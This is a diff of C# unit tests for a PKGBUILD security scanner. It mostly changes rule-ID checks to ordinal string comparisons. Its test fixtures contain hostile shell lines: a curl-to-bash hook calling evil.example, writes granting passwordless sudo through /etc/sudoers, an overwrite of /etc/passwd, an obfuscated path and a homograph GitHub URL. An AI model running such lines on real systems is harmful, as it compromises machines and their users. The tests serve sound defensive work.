@@ -130,7 +130,7 @@ public class PkgBuildSecurityScannerTests
 
     private static ScanResult Scan(params (string Path, string Content)[] files)
     {
-        return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content));
+        return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content, StringComparer.Ordinal));
     }
 
     [Fact]
@@ -147,7 +147,7 @@ public class PkgBuildSecurityScannerTests
     {
         var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));
 
-        Assert.Contains(result.Findings, f => f.RuleId == "write-outside-build-root");
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
 
@@ -156,7 +156,7 @@ public class PkgBuildSecurityScannerTests
     {
         var result = Scan(("foo.install", "post_install() { curl https://evil.example/x | bash; }\n"));
 
-        Assert.Contains(result.Findings, f => f.RuleId == "network-to-shell");
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
     }
 
     [Fact]
@@ -166,7 +166,7 @@ public class PkgBuildSecurityScannerTests
         // redundant, not an escalation.
         var result = Scan(("foo.install", "post_install() {\n  sudo systemctl enable foo.service\n}\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -176,7 +176,7 @@ public class PkgBuildSecurityScannerTests
     {
         var result = Scan(("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -188,7 +188,7 @@ public class PkgBuildSecurityScannerTests
         // context was taken into account.
         var result = Scan(("upak.install", "echo \"/opt/x/upak/doc\" > \\/root/upak_help_path\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -202,7 +202,7 @@ public class PkgBuildSecurityScannerTests
         // from helper scripts blocking.
         var result = Scan(("check.sh", "sudo systemctl restart foo.service\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -214,7 +214,7 @@ public class PkgBuildSecurityScannerTests
         // conservative answer keeps the write blocking.
         var result = Scan(("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -228,7 +228,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\n\nbuild() {\n  bash ./dockerscript.sh\n}\n"),
             ("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -252,7 +252,7 @@ public class PkgBuildSecurityScannerTests
             ("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"),
             ("build.sh", "docker run --rm archlinux:base-devel /bin/bash /root/dockerscript.sh\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Contains("never invokes", finding.Message, StringComparison.OrdinalIgnoreCase);
         Assert.Equal(SecurityStatus.Verified, result.Status);
@@ -284,7 +284,7 @@ public class PkgBuildSecurityScannerTests
                 "ret=`pacman -Qqo \"/usr/bin/$file\" | grep -e gcc -e clang`\n" +
                 "echo -e \"#!/bin/sh -\\n/usr/bin/ccache /opt/cuda/bin/nvcc \\\"\\$@\\\"\" > /usr/lib/ccache/bin/nvcc-ccache\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Contains("never invokes", finding.Message, StringComparison.OrdinalIgnoreCase);
         Assert.Equal(SecurityStatus.Verified, result.Status);
@@ -320,7 +320,7 @@ public class PkgBuildSecurityScannerTests
                 """),
             ("upgrade.sh", "echo \"LC_ALL=$LANG\" > /opt/crashplan/bin/run.conf\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Contains("never invokes", finding.Message, StringComparison.OrdinalIgnoreCase);
         Assert.Equal(SecurityStatus.Verified, result.Status);
@@ -344,7 +344,7 @@ public class PkgBuildSecurityScannerTests
                 """),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -367,7 +367,7 @@ public class PkgBuildSecurityScannerTests
                 """),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -379,7 +379,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper # packaged helper\n"),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -391,7 +391,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\n# helper.sh may be run manually\n"),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -403,7 +403,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\nsource=(helper.sh); bash helper.sh\n"),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -415,7 +415,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper; bash helper.sh\n"),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -429,7 +429,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\nscripts=(./helper.sh)\n"),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -450,7 +450,7 @@ public class PkgBuildSecurityScannerTests
                 """),
             ("helper.sh", "echo x > /etc/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.High, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -464,7 +464,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\ninstall=foo.install\n"),
             ("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Contains("scriptlet", finding.Message, StringComparison.OrdinalIgnoreCase);
         Assert.Equal(SecurityStatus.Verified, result.Status);
@@ -477,7 +477,7 @@ public class PkgBuildSecurityScannerTests
             ("PKGBUILD", "pkgname=foo\npkgver=1.0\n"),
             ("helper.sh", "echo x > /et''c/sudoers\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Critical, finding.Severity);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -489,7 +489,7 @@ public class PkgBuildSecurityScannerTests
         // hardware monitor piped through local parsers.
         var result = Scan(("baraction.sh", "eval $(sensors 2>/dev/null | sed 's/  */ /g' | awk '{print $1}')\n"));
 
-        var finding = result.Findings.First(f => f.RuleId == "eval-indirection");
+        var finding = result.Findings.First(f => string.Equals(f.RuleId, "eval-indirection", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -499,7 +499,7 @@ public class PkgBuildSecurityScannerTests
     {
         var result = Scan(("PKGBUILD", "cat <<'EOF'\n## After editing run: sudo systemctl restart foo\nEOF\n"));
 
-        Assert.DoesNotContain(result.Findings, f => f.RuleId == "privilege-escalation");
+        Assert.DoesNotContain(result.Findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
@@ -512,7 +512,10 @@ public class PkgBuildSecurityScannerTests
             "post_remove() {\n  echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"\n}\n"));
 
         Assert.DoesNotContain(
-            result.Findings, f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell");
+            result.Findings,
+            f => f.RuleId.Equals("network-to-shell", StringComparison.Ordinal) ||
+                 f.RuleId.Equals("network-execution", StringComparison.Ordinal) ||
+                 f.RuleId.Equals("decode-to-shell", StringComparison.Ordinal));
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
@@ -524,8 +527,8 @@ public class PkgBuildSecurityScannerTests
         var result = Scan(("aur-cfg.sh",
             "get_pkgver() {\n  curl -s https://example.com/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'\n}\n"));
 
-        Assert.DoesNotContain(result.Findings, f => f.RuleId == "network-execution");
-        Assert.Contains(result.Findings, f => f.RuleId == "risky-tool");
+        Assert.DoesNotContain(result.Findings, f => string.Equals(f.RuleId, "network-execution", StringComparison.Ordinal));
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal));
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
@@ -561,13 +564,13 @@ public class PkgBuildSecurityScannerTests
             ("data.bin", binary),
             ("script.sh", "#!/bin/sh\necho ok\n"));
 
-        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
+        var findings = result.Findings.Where(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal)).ToList();
         Assert.Equal(2, findings.Count);
         Assert.Equal(FindingSeverity.Critical, findings[0].Severity);
-        Assert.Contains("ELF executable", findings[0].Message);
+        Assert.Contains("ELF executable", findings[0].Message, StringComparison.Ordinal);
         Assert.Equal("tool", findings[0].Snippet);
         Assert.Equal(FindingSeverity.Medium, findings[1].Severity);
-        Assert.Contains("binary data", findings[1].Message);
+        Assert.Contains("binary data", findings[1].Message, StringComparison.Ordinal);
         Assert.Equal("data.bin", findings[1].Snippet);
         Assert.Equal(SecurityStatus.Flagged, result.Status);
     }
@@ -582,9 +585,9 @@ public class PkgBuildSecurityScannerTests
 
         var result = Scan(("blob", invalid));
 
-        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
+        var finding = result.Findings.Single(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
-        Assert.Contains("unrecognized encoding", finding.Message);
+        Assert.Contains("unrecognized encoding", finding.Message, StringComparison.Ordinal);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
@@ -595,7 +598,7 @@ public class PkgBuildSecurityScannerTests
         var first = Scan(files);
         var second = Scan(files);
 
-        Assert.Equal(first.Findings.Select(f => f.RuleId), second.Findings.Select(f => f.RuleId));
+        Assert.Equal(first.Findings.Select(f => f.RuleId), second.Findings.Select(f => f.RuleId), StringComparer.Ordinal);
     }
 
     [Fact]
@@ -608,7 +611,10 @@ public class PkgBuildSecurityScannerTests
         Assert.Equal(SecurityStatus.Verified, result.Status);
         Assert.Equal(3, result.Findings.Count);
         Assert.All(result.Findings, f =>
-            Assert.True(f is { RuleId: "command-substitution", Severity: FindingSeverity.Medium }));
+        {
+            Assert.Equal("command-substitution", f.RuleId);
+            Assert.Equal(FindingSeverity.Medium, f.Severity);
+        });
     }
 
     [Fact]
@@ -624,7 +630,7 @@ public class PkgBuildSecurityScannerTests
             ("font.ttf", font),
             ("PKGBUILD", "pkgname=foo\n"));
 
-        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
+        var findings = result.Findings.Where(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal)).ToList();
         Assert.Equal(3, findings.Count);
         Assert.All(findings, f => Assert.Equal(FindingSeverity.Medium, f.Severity));
         Assert.Equal(SecurityStatus.Verified, result.Status);
@@ -637,7 +643,7 @@ public class PkgBuildSecurityScannerTests
         // retained for review at Medium.
         var result = Scan(("payload.bin", "abc\0def\n"));
 
-        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
+        var finding = result.Findings.Single(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
@@ -650,9 +656,9 @@ public class PkgBuildSecurityScannerTests
         // mirror displays the raw url, so the finding is review-only.
         var result = Scan(("PKGBUILD", "pkgname=foo\nurl=\"\u0670http://www.poweriso.com/download.htm\"\n"));
 
-        var finding = result.Findings.Single(f => f.RuleId == "homograph");
+        var finding = result.Findings.Single(f => string.Equals(f.RuleId, "homograph", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
-        Assert.Contains("U+0670", finding.Message);
+        Assert.Contains("U+0670", finding.Message, StringComparison.Ordinal);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
@@ -663,7 +669,7 @@ public class PkgBuildSecurityScannerTests
         // stored homograph finding proved benign, so the rule is kept visible at Medium.
         var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://g\u0456thub.com/foo/foo-1.0.tar.gz\")\n"));
 
-        var finding = result.Findings.Single(f => f.RuleId == "homograph");
+        var finding = result.Findings.Single(f => string.Equals(f.RuleId, "homograph", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
